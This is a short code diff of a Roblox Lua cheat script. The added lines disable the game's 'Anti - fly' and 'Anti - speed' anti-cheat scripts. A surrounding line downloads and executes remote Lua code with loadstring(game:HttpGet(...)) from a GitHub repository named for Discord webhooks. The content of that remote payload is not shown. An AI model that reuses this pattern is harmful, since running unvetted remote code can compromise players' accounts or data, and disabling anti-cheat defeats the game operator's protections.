@@ -13,6 +13,11 @@ end
 
 ------------------------------------------------------------------------------------------
 
+game:GetService("Workspace").Tljop838["Anti - fly"].Disabled = true
+game:GetService("Workspace").Tljop838["Anti - speed"].Disabled = true
+
+------------------------------------------------------------------------------------------
+
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
 
 ------------------------------------------------------------------------------------------
